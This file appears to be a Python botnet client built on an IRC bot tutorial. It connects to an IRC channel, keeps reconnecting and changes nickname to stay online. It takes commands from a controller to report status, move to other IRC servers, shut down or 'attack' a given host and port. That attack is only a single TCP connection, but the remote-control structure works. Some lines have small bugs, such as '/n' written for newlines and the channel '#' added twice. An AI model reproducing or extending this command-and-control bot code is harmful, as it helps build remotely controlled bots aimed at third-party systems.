#https://pythonspot.com/en/building-an-irc-bot/

import time
import socket
import sys
import random

ERROR_FLAG = -1

#connection info
hostname = ""
port = 0
irc = ""
channel = "#"
con_active = False

#bot info
secret_phrase = ""
nick = "V"
atk_cnt = 0
active = True

'''
------------------------------------------------------------------------
                             Commands 
------------------------------------------------------------------------
'''

#return status to controller	
def cmd_status():
	return_status(nick)
	return
	
	
#attack a specified host 
def cmd_attack(host, port):
	global atk_cnt
	target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	#make connection with target and return status to controller
	try:
		if not port.isdigit():
			print("Error: specified port is not a digit")
			return_status(nick + " failure")
			return
		port = int(port)
		target.connect((host,port))
		target.send(bytes(str(atk_cnt) + " " + nick + "\n", 'UTF-8'))
		return_status(nick + " success")
		atk_cnt += 1
	#failed to attack
	except socket.error:
		return_status(nick + " failure")
	return

	
#move to a new irc server
def cmd_move(host, port_num, chan):
	global irc, hostname, port, channel
	chan = "#" + chan
	if hostname == host and port == port_num:
		return_status(nick + " success")
		channel = chan
		send(irc, "NICK " + nick + "\n")
		send(irc, "JOIN " + channel + "\n")
	else:
		chan = "#" + chan
		old_host = hostname
		old_port = port
		old_channel = channel
		#set to new values
		hostname = host
		port = port_num
		channel = chan
		#attempt connection
		temp_irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		status = connect(temp_irc, host, port)
		
		#if connection failed, reset values
		if status == ERROR_FLAG:
			print("Error: Could not move to new IRC server")
			return_status(nick + " failure")
			hostname = old_host
			port = old_port
			channel = old_channel
		#else close current irc connection and replace with new one
		else:
			#close old IRC connection
			channel = old_channel
			return_status(nick + " success")
			channel = chan
			send(irc, "QUIT I will live on.../n")
			irc.close()
			irc = temp_irc
	return
	
	
#do nothing
def cmd_quit():
	return
	
	
#return status and shutdown
def cmd_shutdown():
	global active
	#signal to communication and program loops to break
	active = False
	#tell controller quitting and disconnect
	return_status(nick + " shutdown")
	send(irc, "QUIT you killed me... /n")
	return


'''
------------------------------------------------------------------------
                             Communication w/ IRC
------------------------------------------------------------------------
'''	
	
#receive a command from the controller
def rcv_command(sock):
	global con_active
	while True:
		try:
			msg = sock.recv(1024).decode('UTF-8', 'ignore').strip()
			print(msg)
			#ping pong protocol
			if msg.find('PING') != -1:
				send(irc, 'PONG ' + msg.split()[1] + '\r\n')
			#parse string to extract message
			else:
				cmd = msg[msg.find(':', 1)+1:]
				break
		except socket.error:
			print("Error: couldn't receive command")
			#signal communication loop that connection is dead
			con_active = False
	return cmd

	
#send as bytes
def send(sock, msg):
	global con_active
	try:
		sock.send(msg.encode('UTF-8', 'ignore'))
	except socket.error:
		#signal communication loop that connection is dead
		con_active = False
	return
	
	
#return a status message to the controller
def return_status(msg):
	send(irc, "PRIVMSG " + channel + " :" + msg + "\n")
	return
	
	
#connect to the specified IRC server and channel
def connect(sock, host, port):
	global nick, con_active
	#ensure port is a number
	if not port.isdigit():
		print("Error: specified port is not a digit")
		return ERROR_FLAG
	port = int(port)
	#connect to IRC
	try:
		sock.connect((host,port))
		con_active = True
		print("connection made")
	except socket.error:
		print("Error: connection could not be made")
		return ERROR_FLAG
	#register with IRC until free nickname is found
	while (True):
		send(sock, "USER " + nick + " " + nick + " " + nick + ": This bot is connecting\n")
		send(sock, "NICK " + nick + "\n")
		send(sock, "JOIN " + channel + "\n")
		if rcv_command(sock).find("already in use") != -1:
			suffix = random.randint(0, 10000)
			nick = "V" + str(suffix)
		else:
			break
	return 


'''
------------------------------------------------------------------------
                             Communication loop
------------------------------------------------------------------------
'''
	
#handle the connection to the IRC server
def handle_connection():
	#TO DO Verify controller
	
	while active:
		#wait for commands
		cmd = rcv_command(irc)
		cmd = cmd.split()
		#interpret command
		if cmd == "\n":
			pass
		elif cmd[0] == "status":
			cmd_status()
		elif cmd[0] == "attack":
			try:
				cmd_attack(cmd[1], cmd[2])
			except IndexError:
					print("Error: Insufficient arguments for cmd(attack)")	
		elif cmd[0] == "move":
			try:
				cmd_move(cmd[1], cmd[2], cmd[3])
			except IndexError:
				print("Error: Insufficient arguments for cmd(move)")	
		elif cmd[0] == "quit":
			cmd_quit()
		elif cmd[0] == "shutdown":
			cmd_shutdown()
		elif con_active == False:
			print("Error: Connection is dead")
			break
		else:
			print("Error: Unrecognized command received '" + ' '.join(cmd) + "'")
	return


'''
------------------------------------------------------------------------
                             Program loop
------------------------------------------------------------------------
'''

#main
def main():
	global hostname, port, channel, secret_phrase, irc
	#ensure correct number of commands
	if len(sys.argv) != 5:
		print("Error: Incorrect number of command line arguments. Command is...")
		print("\tbot.py <hostname> <port> <channel> <secret-phrase>")
		return
	#extract arguments from command line
	hostname = sys.argv[1]
	port = sys.argv[2]
	channel = channel + sys.argv[3]
	secret_phrase = sys.argv[4]
	#loop to keep trying to connect to irc when not shutdown
	while True:
		#connect to the IRC server
		irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		status = connect(irc, hostname, port)
		if status != ERROR_FLAG:
			#handle the connection
			handle_connection()
		#if handle_connection exited without shutdown command
		if active == True:
			#wait 5 seconds before retrying connection
			time.sleep(5)
		else:
			break
	return


'''
------------------------------------------------------------------------
                             Call Program
------------------------------------------------------------------------
'''

main()
